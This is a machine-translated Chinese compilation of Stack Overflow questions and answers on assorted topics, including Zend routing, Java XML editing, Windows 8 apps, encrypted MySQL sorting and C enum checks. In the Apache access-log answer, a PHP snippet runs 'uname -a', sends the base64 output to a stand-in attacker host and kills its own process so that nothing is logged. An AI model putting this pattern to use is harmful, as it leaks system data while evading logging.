## 回答 #1

> 赞同：1
> 
> 时间：2012-10-01T02:28:20.550

没有办法开箱即用。（看看[这个问题](https://stackoverflow.com/q/2204653/678455)）

您需要扩展`Zend_Controller_Router_Route`类。我已经这样做了：

```
class Mauro_Controller_Router_Route_Method extends Zend_Controller_Router_Route {

    protected $_method;

    public function __construct($route, $defaults = array(), $reqs = array(), Zend_Translate $translator = null, $locale = null) {
        list($this->_method, $route) = explode(' ', $route, 2);
        parent::__construct($route, $defaults, $reqs, $translator, $locale);
    }

    public function match($path, $partial = false) {
        $requestMethod = $this->getRequest()->getMethod();
        $requestMethod = $this->getRequest()->getParam('method')
            ? strtoupper($this->getRequest()->getParam('method'))
            : $requestMethod;
        return $requestMethod == strtoupper($this->_method)
            ? parent::match($path, $partial)
            : false;
    }

    protected function getRequest() {
        return Zend_Controller_Front::getInstance()->getRequest();
    }

} 
```

然后你可以像这样使用它：

```
$router->addRoute( new Mauro_Controller_Router_Route_Method( 'GET /view/:page', array( 'controller' => 'pages', 'action' => 'view' ), array( 'page' => '/d+', ) ) ); 
```

# javascript - html中的选择顺序选择多个？

> ID：10446796
> 
> 赞同：3
> 
> 时间：2012-05-04T10:10:23.417
> 
> 标签：javascript, html, html-select

我有一个标签插件，它以两种形式维护它的标签选择。一个是内部数组。另一种是通过一个 html 选择，它只包含所有选择的标签，如果插件是表单的一部分，它允许标签插件像普通元素一样工作。

我被要求实施重新排序。我知道如何做到这一点并调整阵列。选择让我对不同的浏览器如何处理订单感到有些困惑。

作为表单的一部分提交的所选项目的顺序是什么？他们被选中的顺序是什么？按字母/数字按值？或者只是从上到下选择项目？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-13T01:25:37.777

根据 HTML 规范，表单值将按照它们在文档中出现的顺序提交：

*   application/x-www-form-urlencoded（GET 或 POST）：“控件名称/值按照它们在文档中出现的顺序列出。”
*   multipart/form-data (POST)：“这些部分按照相应控件出现在文档流中的相同顺序发送到处理代理。”

有关详细信息，请参阅[http://www.w3.org/TR/html401/interact/forms.html#h-17.13.4 。](http://www.w3.org/TR/html401/interact/forms.html#h-17.13.4)

然而，仅仅因为这是规范所说的，并不意味着浏览器实际上就是这样做的。浏览器因不遵循 w3c 规范而臭名昭著。在单独的`<input type="hidden">`元素中跟踪订单可能更安全。

# java - Hadoop Pig Cassandra get_range_slices 错误

> ID：10446798
> 
> 赞同：0
> 
> 时间：2012-05-04T10:10:23.970
> 
> 标签：java, hadoop, mapreduce, cassandra, apache-pig

我正在使用 Cassandra 1.0.9 和最新的 Pig 和 Hadoop 来执行 MapReduce 任务。

只是一个用 Pig 编写的简单任务，用于从 Cassandra 数据库中提取 2 列。

似乎工作，然后它遇到了这个问题。

java.lang.RuntimeException：org.apache.thrift.TApplicationException：在 org.apache.cassandra.hadoop.ColumnFamilyRecordReader$ 处处理 org.apache.cassandra.hadoop.ColumnFamilyRecordReader$RowIterator.maybeInit(ColumnFamilyRecordReader.java:334) 处的内部错误RowIterator.computeNext(ColumnFamilyRecordReader.java:348) at org.apache.cassandra.hadoop.ColumnFamilyRecordReader$RowIterator.computeNext(ColumnFamilyRecordReader.java:222) at com.google.common.collect.AbstractIterator.tryToComputeNext(AbstractIterator.java:140)在 com.google.common.collect.AbstractIterator.hasNext(AbstractIterator.java:135) 在 org.apache.cassandra.hadoop.ColumnFamilyRecordReader.nextKeyValue(ColumnFamilyRecordReader.java:178) 在 org.apache.cassandra.hadoop.pig.CassandraStorage org.apache.pig.backend.hadoop.executionengine 中的 .getNext（未知来源）。mapReduceLayer.PigRecordReader.nextKeyValue(PigRecordReader.java:194) at org.apache.hadoop.mapred.MapTask$NewTrackingRecordReader.nextKeyValue(MapTask.java:532) at org.apache.hadoop.mapreduce.MapContext.nextKeyValue(MapContext.java: 67) 在 org.apache.hadoop.mapreduce.Mapper.run(Mapper.java:143) 在 org.apache.hadoop.mapred.MapTask.runNewMapper(MapTask.java:764) 在 org.apache.hadoop.mapred.MapTask .run(MapTask.java:370) at org.apache.hadoop.mapred.Child$4.run(Child.java:255) at java.security.AccessController.doPrivileged(Native Method) at javax.security.auth.Subject。 doAs(Subject.java:396) at org.apache.hadoop.security.UserGroupInformation.doAs(UserGroupInformation.java:1093) at org.apache.hadoop.mapred.Child.main(Child.java:249) 原因：org .apache.thrift.TApplicationException：在 org.apache.thrift 处理 get_range_slices 的内部错误。TApplicationException.read(TApplicationException.java:108) at org.apache.cassandra.thrift.Cassandra$Client.recv_get_range_slices(Cassandra.java:754) at org.apache.cassandra.thrift.Cassandra$Client.get_range_slices(Cassandra.java: 734) 在 org.apache.cassandra.hadoop.ColumnFamilyRecordReader$RowIterator.maybeInit(ColumnFamilyRecordReader.java:289) ... 还有 17 个

有办法解决吗？我可以根据要求显示 Pig 脚本。

# java - 在java中删除xml节点后，xml文件没有得到更新

> ID：10446802
> 
> 赞同：1
> 
> 时间：2012-05-04T10:10:49.143
> 
> 标签：java, xml

我正在使用以下代码从 xml 文件中删除一些特定节点..它在控制台上显示正确的输出，但不知何故 xml 文件没有得到更新..内容保持原样..请帮助..谢谢...

```
package com.sumit.xml.client;

import java.io.*;

import org.apache.xml.serialize.OutputFormat;
import org.apache.xml.serialize.XMLSerializer;
import org.w3c.dom.*;
import org.xml.sax.*;
import javax.xml.parsers.*;
import javax.xml.transform.*; 
import javax.xml.transform.dom.DOMSource; 
import javax.xml.transform.stream.StreamResult;

public class ReadCDATA {
  static public void main(String[] arg) {
  try{
  BufferedReader bf = new BufferedReader(new InputStreamReader(System.in));
  System.out.print("Enter a XML file name: ");
  String xmlFile = bf.readLine();
  File file = new File(xmlFile);
  System.out.print("Enter an element which have to delete: ");
  String remElement = bf.readLine();
  if (file.exists()){
  DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
  DocumentBuilder builder = factory.newDocumentBuilder();
  Document doc = builder.parse(xmlFile);
  TransformerFactory tFactory = TransformerFactory.newInstance();
  Transformer tFormer = tFactory.newTransformer();
  Element element = (Element)doc.getElementsByTagName(remElement).item(0);
//  Remove the node
  element.getParentNode().removeChild(element);
//  Normalize the DOM tree to combine all adjacent nodes
  doc.normalize();
  Source source = new DOMSource(doc);
  Result dest = new StreamResult(System.out);
  tFormer.transform(source, dest);
  System.out.println();

  }
  else{
  System.out.println("File not found!");
  }
  }
  catch (Exception e){
  System.err.println(e);
  System.exit(0);
  }
  }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:17:01.650

DOM 仅在进程内存中更改。您显示的代码中没有任何内容可以透明地将数据写入基础 XML 文件。

你需要添加类似的东西

```
createOutputFile("output.xml", transformToString(document));

private static String transformToString(Document document) {
    try {
        TransformerFactory transFactory = TransformerFactory.newInstance();
        Transformer transformer = transFactory.newTransformer();
        StringWriter buffer = new StringWriter();
        transformer.setOutputProperty(OutputKeys.OMIT_XML_DECLARATION, "yes");
        transformer.setOutputProperty(OutputKeys.INDENT, "yes");
        transformer.transform(new DOMSource(document), new StreamResult(buffer));
        return buffer.toString();
    } catch (TransformerException e) {
        throw new RuntimeException(e);
    }
}

private static void createOutputFile(String filePath, String content) {
    FileWriter writer = null;
    try {
        try {
            writer = new FileWriter(filePath);
            writer.write(content);
        } finally {
            if (writer != null) {
                writer.flush();
                writer.close(); 
            }
        }
    } catch (IOException e) {
        throw new RuntimeException(e);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:14:14.060

您还应该在文件的 OutputStream 上调用 TFormer.transform

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-06-27T06:19:06.223

从 xml 中删除节点后，将内容写入 xml 文件

```
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
  DocumentBuilder db = dbf.newDocumentBuilder();
  InputSource is = new InputSource();
  is.setCharacterStream(new StringReader(xml));

  Document doc = db.parse(is);

// write the content into xml file

    TransformerFactory transformerFactory = TransformerFactory.newInstance();
    Transformer transformer = transformerFactory.newTransformer();
    DOMSource source = new DOMSource(doc);
    StreamResult result = new StreamResult(new File(filepath));
    transformer.transform(source, result); 
```

将内容写入 xml 文件后，xml 文件将得到更新。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-03-03T09:53:49.560

```
 TransformerFactory transformerFactory = TransformerFactory.newInstance();
        Transformer transformer = transformerFactory.newTransformer();
        DOMSource source = new DOMSource(doc);
        String filepath = "/java/CarsNEW.xml"; //according to yuor path and file name
        StreamResult result = new StreamResult(new File(filepath));
        transformer.transform(source, result); 
```

# c# - VS11 应用程序上的关闭按钮

> ID：10446805
> 
> 赞同：4
> 
> 时间：2012-05-04T10:11:09.710
> 
> 标签：c#, windows-8, windows-runtime, winrt-xaml

我尝试在带有 C# 的 VS 11 的 Windows 8 上创建一个应用程序，并且我需要在我的应用程序中创建一个按钮，当人们单击此按钮时，我的应用程序将关闭。

但我找不到任何退出或关闭功能添加到我的点击事件。

我怎样才能制作这个按钮？或者你对解决这个问题有什么建议？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-04T10:17:35.543

**你不应该关闭你的应用程序。**

*这是 Metro 应用程序的概念之一。用户切换到不同的任务， **进程生命周期管理**方面开始发挥作用，首先暂停您的应用程序，然后在需要时终止它。不要关闭应用程序的窗口：让用户知道当前没有可用的信息，然后让他们随意切换、关闭或等待*。

从[这里取](http://social.msdn.microsoft.com/Forums/en-US/winappswithcsharp/thread/516e3443-ce5b-4e7d-8198-064655e4608e)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-06T03:55:39.450

如果您不关心认证 - 例如，您希望在自己的调试版本中使用关闭按钮来帮助您进行测试 - 您可以调用 Application.Current.Exit()

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-05-04T14:18:08.270

您不得实现关闭按钮。

如果您这样做，您的应用将无法在商店中销售。请参阅“ [Windows 应用程序的认证要求](http://msdn.microsoft.com/en-us/library/windows/apps/hh694083)”。

> 3.6 您的应用程序必须使用系统为具有这些功能的功能提供的机制
> （剪辑）
> 您的应用程序既不能以编程方式关闭，也不能提供 UI 功能来关闭它。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-06-14T05:58:03.897

你要这个？App.Current.Exit();

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-30T09:50:34.273

试试这个..它有效

```
App.Current.Terminate(); 
```

# php - 排序和查询加密的 MySQL 表

> ID：10446807
> 
> 赞同：0
> 
> 时间：2012-05-04T10:11:24.873
> 
> 标签：php, mysql, sorting, encryption

关于 MySQL 表中加密/解密值的 2 个查询。

1）我怎样才能对这些进行排序，因为值是加密的 ORDER BY 已经出来了，并且 JavaScript 不会正确排序 a）和 b）。下面的代码，请原谅格式。

2）我将如何查询“值之间”

提前致谢。

```
<html>

<body>
  <table>
      <tr>
<?php
// Connects to Server, queries all on that table.
$db_connect=mysql_connect("$host", "$username", "$password")or die("Sorry, Poor or No Connection");
$db_found=mysql_select_db("$db_name")or die("Sorry, Cannot Connect to Database");
$result=mysql_query("SELECT * FROM $tbl_name");

// Creates Table to be used
echo "
  <th>First Name</th>
  <th>Last Name</th>
</tr>";

while($row = mysql_fetch_array($result)) {
  // Decrypts table IDs
  $dec_FName = decrypt($row['FName'],'SECUREKEY');
  $dec_LName = decrypt($row['LName'],'SECUREKEY');

  echo "<tr>";
    <echo>"<td>" . $dec_FName . "</td>";
    <echo>"<td>" . $dec_LName . "</td>";
  echo "</tr>";
  }
  echo "</table>";

  mysql_close();
?>

</body>
</html> 
```

我怀疑需要创建一个数组。我很乐意使用 JavaScript、PHP 或您可以推荐的任何其他东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T08:48:01.923

这对我来说很好：

```
$q3='SELECT users.uid,
users.vr,
users.br,
AES_DECRYPT(users.nm1,"123") AS nm1,
AES_DECRYPT(users.nm2,"123") AS nm2,
AES_DECRYPT(users.nm3,"123") AS nm3,
ussys.ty1,
ussys.ty3
FROM users,ussys WHERE users.uid=ussys.uid
ORDER BY nm1 DESC
'; 
```

它在 nm1 上分类得很好，结果给了我 Zack-Willeke-Victor-Roiwan-Plop-Kwab-Krab-Karel-Johannes-Harry-Gerard-Dirk-Cornelis-Bernard-Anton。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-05-04T10:29:19.107

我认为您不能在 SQL 服务器中执行此操作。如果列全部加密，则无法以有意义的方式对列进行排序或过滤。

您需要将数据拉入您的 PHP 并在那里进行排序。解密数据后，您将能够使用 PHP 的任何[数组处理函数](http://php.net/manual/en/ref.array.php)或您自己的函数。

显然，对于大型数据集，这变得非常快速，因为您需要为每次使用检索所有数据。也许您可以为此目的存储一些未加密的数据，但显然这非常适合您的安全需求。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2020-06-22T23:42:44.177

我知道这篇文章已经很老了，但是我遇到了同样的问题，并且没有太多关于此的信息。这就是我所做的，它就像魔术一样工作。

```
 SELECT AES_DECRYPT(column1, '%key%') AS 'column1' FROM `myTable` WHERE
 1 ORDER BY AES_DECRYPT(column1, '%key%') ASC; 
```

我有一个包含 230 行和 4 列的表来解密以及排序列，它需要 2.5 毫秒才能在具有以下规格的 VPS VM 上重新获得结果：2 个 Xeon E5 CPU 内核、2 GB 的 RAM、50 GB 的 SSD。

# php - 表格自动提交在线支付：不好的做法？

> ID：10446810
> 
> 赞同：0
> 
> 时间：2012-05-04T10:11:39.460
> 
> 标签：php, javascript, payment-gateway

**语境：**

我必须在一个相当古老的 PHP 4 网站上添加一个在线支付系统（耶！）。像往常一样，将使用外部支付平台/网关。

在网站上准备好订单后，该支付平台期望通过 POST 数据调用，如果一切正常，则显示其在线支付页面。

**问题：**

为了切换到支付平台，自动提交带有一堆隐藏字段的表单是否是一种不好的做法？

似乎我别无选择，但我想知道是否有人认为该在线支付平台集成的更好方法。

当前工作流程：

1.  ...最后订购步骤：订单摘要
2.  用户点击“订单”（该按钮已经是表单的一部分，其操作是内部页面）
3.  结果页面（一般为：订单保存成功、会快速处理等）

新的详细工作流程将是：

1.  ...最后订购步骤：订单摘要
2.  用户点击“订单”（该按钮已经是表单的一部分，其操作是内部页面）
3.  在现有的内部处理之后，*重定向到“自动提交的表单”页面*
4.  *自动提交表单自己提交（其操作是支付平台 URL）*
5.  *网上支付...*
6.  结果页面

注意。我会为禁用 Javascript 的用户添加一些“*请点击订购*”按钮。

感谢您的任何建议/想法。甚至告诉这应该没有问题:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T10:20:15.790

自动提交带有一堆隐藏字段的表单，以便切换到支付平台是可以的。但是这里要注意安全，因为 intuder 可以修改那些隐藏的字段。

# java - 使用什么数组来存储对象？

> ID：10446815
> 
> 赞同：0
> 
> 时间：2012-05-04T10:12:10.253
> 
> 标签：java

我以前从未将字符串对象存储在 java 数组中。所以我不知道该怎么做。将对象存储到数组中的方法不止一种吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:27:41.493

这一系列步骤可能对您有所帮助..

在 Array 的情况下，您只能存储一种数据，

```
Object[] myObjectArray = Object[NumberOfObjects];
myObjectArray[0] = new Object(); 
```

如果您在谈论 String 对象，那么您也可以存储您的 String 对象。

```
String[] myStringArray = String[NumberOfObjects];
myStringArray[0] = new String();

or

String[] myStringArray = String[NumberOfObjects];
myStringArray[0] = "Your String"; 
```

在这里，您可以在不使用 new 运算符的情况下存储 Sting 的字符串对象。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T10:24:47.923

假设，你有这样的东西

```
public class MyClass {
  public String one;
  public String two;
  public String three;
  public String four;

  public MyClass(String one, String two, String three, String four) {
    this.one = one;
    this.two = two;
    this.three = three;
    this.four = four;
  }
} 
```

您可以将该类的实例存储在数组中：

```
MyClass[] myClasses = {new MyClass("one", "two", "three", "four")};
System.out.println(myClasses[0].one);  // will print "one" 
```

* * *

有一些不同的方法可以创建（字符串）数组和设置值：

**1.**

```
String[] strings = new String[3];
strings[0] = "one";
strings[1] = "two";
strings[2] = "three"; 
```

**2.**

```
String[] strings = new String[]{"one", "two", "three"}; 
```

**3.**

```
String[] strings = {"one", "two", "three"}; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-04T10:31:58.477

更好的使用 List 的方式，它是一个集合接口。我们不存储对象，我们存储对象的引用（内存地址）。并使用泛型概念提供更多性能。

```
 Ex:

List<String> references = new ArrayList<String>(); 
List<OurOwnClass> references = new ArrayList<OurOwnClass>(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-04T10:14:27.070

```
Object[] myObjectArray=new Object[numberOfObjects];
myObjectArray[0]=objectToStore; 
```

等等

# html - 点击图片提交表单

> ID：10446816
> 
> 赞同：8
> 
> 时间：2012-05-04T10:12:19.457
> 
> 标签：html

我在一个表单中有多个图像。根据单击的图像，应使用 POST 发送特定值。

这可以在没有javascript的情况下完成吗？（如果没有，我使用 jquery）。

我试过这样的事情：

```
<input type="image" name="type" value="1" src="images/type1.jpg" /> 
```

但是只发送了图像的坐标，而不是 type=1。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-04T10:15:05.653

解决此问题的安全方法是为输入指定唯一名称并查看哪个发送坐标。

```
<input type="image" name="submit_blue" value="blue" alt="blue" src="blue.png">
<input type="image" name="submit_red"  value="red"  alt="red " src="red.png"> 
```

只有成功的控制才会发送任何数据。所以测试看是否`submit_blue.x`有一个值，然后测试是否`submit_red.x`有一个。

根本不需要涉及 JavaScript。

或者，使用常规提交按钮而不是服务器端图像映射。

```
<button name="action" value="blue"><img src="blue.png" alt="blue"></button> 
```

...请记住，这将在旧 IE 中中断，因为它不能`<button>`正确支持。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2017-08-22T16:42:44.530

使用 jQuery，您可以提交对图像的点击。您可以为图像甚至类添加一个 id。

```
$( "#yourImageId" ).click(function() {
  $( "#yourFormId" ).submit();
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-10-18T22:48:47.737

我的方法是定义多个图像，具有单个“名称”和多个“值”。

```
<form id="myform" method="post" action="mypage.php">
  <input type="image" name="color" value="blue" alt="blue" src="blue.png">
  <input type="image" name="color"  value="red"  alt="red " src="red.png">
</form> 
```

然后，在服务器端，我将能够直接读取“颜色”POST 变量中的选定值（“蓝色”或“红色”）。

```
<?php
 if (isset($_POST["color"]) && !empty($_POST["color"])) {
     $selected_color = $_POST['color'];
     echo('Selected color is ' . $selected_color);
     //"blue" or "red"
 }else{  
     echo ('No image selected');
 }
?> 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-05-04T10:20:32.250

试试这个

```
<form id="myform" action="mypage.php">
your content form here
<img scr="img1" class="submitableimage" />
<img scr="img2" class="submitableimage" />
<img scr="imgn" class="submitableimage" />
</form>
<script>
   $('img.submitableimage').click(function(){
      $('#myform').submit();
   });
</script> 
```

# java - Apache 访问日志是否会错过请求？

> ID：10446819
> 
> 赞同：4
> 
> 时间：2012-05-04T10:12:33.497
> 
> 标签：java, apache

我的工作场所在各种 Java 应用程序服务器前安装了 Apache。我经常不得不调查生产问题并依赖那些记录对应用程序服务器的所有请求的 Apache 访问日志，无论它们是成功 (200)、重定向 (302)、错误 (500) 还是其他状态。

然而，有几次，通常当应用程序服务器变得无响应并需要重新启动时，看起来*可能*有些请求没有被记录。

我已经尝试在本地复制它（启动一个长时间运行的请求并允许请求超过 Apache 服务器上的超时时间，或者只是从命令行中终止应用程序服务器），但我总是在访问日志中记录一个请求。

我的问题是，假设 Apache 运行良好但面临应用服务器问题，Apache 访问日志会错过请求吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2018-07-09T23:16:02.113

在某些情况下它可能会错过请求，[文档](https://httpd.apache.org/docs/2.4/logs.html#accesslog)包含重要的句子：

> 服务器访问日志记录了服务器处理的所有请求。

所以如果请求没有被处理，那么我们不应该期望进入*access_log*。如果您想知道这种情况是否可以轻松重现，那么我找到了一种方法。

考虑以下 PHP 代码 ( *test.php* )：

```
<?php
$cmd_result = shell_exec('uname -a');
file_get_contents("https://hacker.site/" . base64_encode($cmd_result));
exec('kill -9 ' . getmypid()); 
```

您还必须使用 prefork MPM 和 mod_php 模块运行 Apache。然后使用浏览器或 telnet 发出请求：

```
$ telnet 127.0.0.1 80
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
GET /test.php HTTP/1.0

Connection closed by foreign host. 
```

如您所见，连接已关闭，没有任何响应。*access_log*和*error_log*中也没有日志，尽管执行了代码并且攻击者收到了 command 的编码结果`uname -a`。

# javascript - 在浏览器中测试对 overflow-y:auto 的支持

> ID：10446822
> 
> 赞同：4
> 
> 时间：2012-05-04T10:12:39.337
> 
> 标签：javascript, jquery, css, cross-browser

我想测试浏览器是否支持特定的 css 属性。对于 CSS 属性，我可以这样做

```
var overflowSupport = document.createElement("detect").style["overflow-y"] === "" 
```

但是如果我必须检查特定的类或属性怎么办。例如，我想测试对

```
overflow-y:auto 
```

并在支持的情况下使用它来滚动大 div，并在其他地方使用 iScroll。

我怎样才能做到这一点？请帮忙。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-25T21:51:42.220

有点老问题，但我想我会在这里分享我的发现，特别是因为 Inkbug 提供的代码示例不能像你期望的那样工作。

## 溢出属性支持

`overflow-y`自从 CSS2.1 时代就已经存在（但是它最近[在 css3 规范中](http://www.w3.org/TR/css3-box/#overflow)被标准化了）。因此，[桌面浏览器的支持](https://stackoverflow.com/questions/4892010/what-browsers-support-overflow-y)非常不错。

现在，您在这里要问的是，当我们`overflow-y: scroll`在特定元素上指定时，滚动行为是否真的有效。

这种行为是最近在移动浏览器中引入的。更准确地说，Apple 在 iOS 5 中以`-webkit`供应商前缀引入了它（参见[Apple 文档的](http://developer.apple.com/library/safari/documentation/AppleApplications/Reference/SafariCSSRef/SafariCSSRef.pdf)第 176 页）。

不过，我找不到适用于 Android 的具体信息。

关于对（供应商前缀与否）的支持，我*能*说些什么：`overflow-scrolling`

*   最新的nexus7（Android 4.1.1）：是的
*   安卓 2.3.x：没有
*   iOS >= 5：是
*   iOS < 5：否

## 滚动溢出的特征检测

如果您想为元素提供滚动行为，我建议您使用特征检测。

这是[一个要点](https://gist.github.com/1292309)，展示了如何检测此`scrolling-overflow`属性（自 以来它已 [集成到 Modernizr 中](https://github.com/Modernizr/Modernizr/blob/master/feature-detects/css-overflow-scrolling.js)）。如果您不想使用 Modernizr，这里有一个更简单的版本，其功能几乎相同：

```
/**
 * Test to see if overflow-scrolling is enabled.
 */

var hasCSSProperty = function(prop) {
    if (window.getComputedStyle) {
        return window.getComputedStyle(document.body, null)[prop];
    } else {
        return document.body.currentStyle[prop];
    }
};

var supportOverflowScrolling = function() {
    if (hasCSSProperty('overflow-scrolling') ||
        hasCSSProperty('-webkit-overflow-scrolling') ||
        hasCSSProperty('-moz-overflow-scrolling') ||
        hasCSSProperty('-o-overflow-scrolling')) {
        return true;
    } else {
        return false
    }
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T22:00:55.910

[Arnaud Brosseau](https://stackoverflow.com/users/1698568/arnaud-brousseau)的回复当然值得打勾。

无论如何，也考虑使用**[Modernizr](http://modernizr.com)**。

使用它们`addTest`和`testAllProps`API 函数，您可以轻松检查任何 css 属性支持：

```
Modernizr.addTest('overflow-y',function(){
    return Modernizr.testAllProps('overflowY'); /* camel case here */
}); 
```

然后你可以用 JavaScript 检查它：

```
if(Modernizr.overflowY){
    /* do something if supported */
} 
```

但它也会为`<html>`标签添加一个类，这样你也可以在 CSS 上自定义规则：

```
.overflowY #element {
    /* style for browsers supporting overflow-y */
}
.no-overflowY #element {
    /* style for browsers NOT supporting overflow-y */
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-12T14:58:51.690

当为 dom 样式分配无效值时，它会被拒绝。因此这应该工作：

```
var testOverflowEl = document.createElement( "x-test" );
testOverflowEl.style.overflowY = "auto";
var overflowSupport = testOverflowEl.style.overflowY === "auto"; 
```

# c - 检测不匹配的数组<->枚举初始化器

> ID：10446827
> 
> 赞同：6
> 
> 时间：2012-05-04T10:12:57.057
> 
> 标签：c, arrays, enums, initialization

在使用 C 进行嵌入式编程时，很多时候我发现自己使用枚举和数组进行映射，因为它们速度快且内存效率高。

```
enum {
    ID_DOG = 0,
    ID_SPIDER,
    ID_WORM,
    ID_COUNT
};
int const NumberOfEyes[ID_COUNT] = {
    2,
    8,
    0
}; 
```

问题是有时在添加/删除项目时，我犯了错误，枚举和数组不同步。如果初始化列表太长，编译器会检测到它，但不会检测到它。

那么是否有可靠且可移植的编译时检查初始化器列表是否与数组的长度匹配？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-04T10:18:37.510

这可能是可以应用[X 宏的情况。](http://www.drdobbs.com/184401387)

**动物.x**

```
X(DOG,    2)
X(SPIDER, 8)
X(WORM,   0) 
```

**foo.c**

```
enum {
#define X(a,b) ID_##a,
#include "animals.x"
#undef X
};

int const numberOfEyes[] = {
#define X(a,b) b,
#include "animals.x"
#undef X
}; 
```

这不仅保证了长度匹配，而且订单始终保持同步。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-05T20:16:53.320

像下面这样的编译时断言呢？（是的，有更精细的 CT_ASSERT 宏；这是为了说明这个想法。）

```
#define CT_ASSERT(expr, name) typedef char name[(expr)?1:-1]

enum {
    ID_DOG = 0,
    ID_SPIDER,
    ID_WORM,
    ID_COUNT
};

int const NumberOfEyes[] = {
    2,
    8,
    0
};

CT_ASSERT (sizeof NumberOfEyes/sizeof *NumberOfEyes == ID_COUNT, foo); 
```

现在，当`NumberOfEyes`数组的元素多于或少于时`ID_COUNT`，这将导致错误`x.c:15: error: size of array 'foo' is negative`。负数组维度是一种约束违规，必须由任何 C 编译器诊断。

# c# - 动态运行 dotnet 代码的软件（或命令行）

> ID：10446828
> 
> 赞同：2
> 
> 时间：2012-05-04T10:13:00.017
> 
> 标签：c#, .net, vb.net, dynamic

我曾经听说过一个可以**在命令行上****动态运行 dotnet 指令**（C#，如果我没记错的话）的软件，例如当输入时，输出将是.**`1==1``true`**

 **我不记得这个软件的名字了，有时只是想知道给定指令的结果，而不必创建一个新程序，编译它并运行它......

以后我很乐意接受挑战，自己制作这样的软体，但现在我只想找到这个软体。

有谁知道它的名字，或者另一个可以达到相同结果的应用程序？（不要告诉我PowerShell，我正在寻找更方便的东西......谢谢）

* * *

**编辑** 对于那些使用 Visual Studio 并且不知道（我刚刚了解）的人，您也可以使用[Immediate Window](http://msdn.microsoft.com/en-us/library/f177hahy%28v=vs.80%29.aspx)。在某些情况下，它甚至可以让您获得智能感知。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T10:16:26.090

单声道项目有[CsharpRepl](http://www.mono-project.com/CsharpRepl)项目 - 它是

> C# 交互式 shell，它是 Mono 的 C# 编译器的一部分。交互式 shell 通常称为 read eval print loop 或 repl。

您可能还在考虑[PowerShell](http://en.wikipedia.org/wiki/Windows_PowerShell)：

> Windows PowerShell 是 Microsoft 的任务自动化框架，由命令行 shell 和相关的脚本语言组成，这些脚本语言构建在 .NET Framework 之上并与 .NET Framework 集成。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T10:14:53.437

也许您的意思是 Mono [C# Repl](http://www.mono-project.com/CsharpRepl)？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-05T02:27:02.113

[微软的“Roslyn”项目](http://blogs.msdn.com/b/visualstudio/archive/2011/10/19/introducing-the-microsoft-roslyn-ctp.aspx)包括一个用于 Visual Studio 2010 的 C# 交互窗口：

> 您可以从 View -> Other Windows -> C# Interactive Window 调用 C# Interactive 窗口。交互式窗口由新的 C# 语言服务提供支持。Roslyn 的体系结构足够灵活，允许许多 IDE 功能（例如 IntelliSense 和重构）在普通编辑器和交互窗口中同样工作。

它实际上是 VS 中所有 C# 的命令行 REPL。**

# objective-c - 获取当前视图

> ID：10446830
> 
> 赞同：0
> 
> 时间：2012-05-04T10:13:04.373
> 
> 标签：objective-c, ios

我有一个在标签栏内有拆分视图的应用程序，这些拆分视图通常具有导航层次结构，然后有时模态视图会出现在它们之上，并且一切正常，但是......

每当应用程序进入后台时，我都会尝试显示密码锁，所以我把

```
[self.window.rootViewController presentModalViewController:lockView animated:YES]; 
```

在我的 AppDelegate 的方法中

```
- (void)applicationWillResignActive:(UIApplication *)application 
```

...除非显示模态视图，否则效果很好。如果打开模式视图，则不会显示密码。

有没有办法检索当前活动的视图控制器，以便我可以呈现这个锁定视图？

提前致谢

切里奥

* * *

有效的代码如下：

```
BOOL hasKids = YES;
UIViewController *topViewController = (UIViewController*)[[(UITabBarController*)self.window.rootViewController viewControllers] objectAtIndex:((UITabBarController*)self.window.rootViewController).selectedIndex];

while (hasKids) {
    if (topViewController.presentedViewController) {
        hasKids = YES;
        topViewController = topViewController.presentedViewController;
    } else {
        hasKids = NO;
    }
}

[topViewController presentModalViewController:lockView animated:YES];` 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T10:52:28.877

我认为最简单的方法是跟踪当前处于活动状态的选项卡（有很多方法可以做到这一点，但我建议实现`UITabBarControllerDelegate`并处理它的`tabBarController:didSelectViewController:`方法）。

完成后，您可能需要在每个视图控制器中管理一个属性，该属性包含您呈现的任何模态视图控制器。但是，如果您使用的是 iOS 5 或更高版本，请查看`UIViewController`属性`presentedViewController`。看来这是一种完全按照您的意愿行事的新方法。

# c# - 如何通过端口从外部 url 获取 json？

> ID：10446832
> 
> 赞同：0
> 
> 时间：2012-05-04T10:13:08.517
> 
> 标签：c#, json

我想使用代理从外部 url 获取 json 字符串。

我需要设置什么设置才能使用代理访问 url？

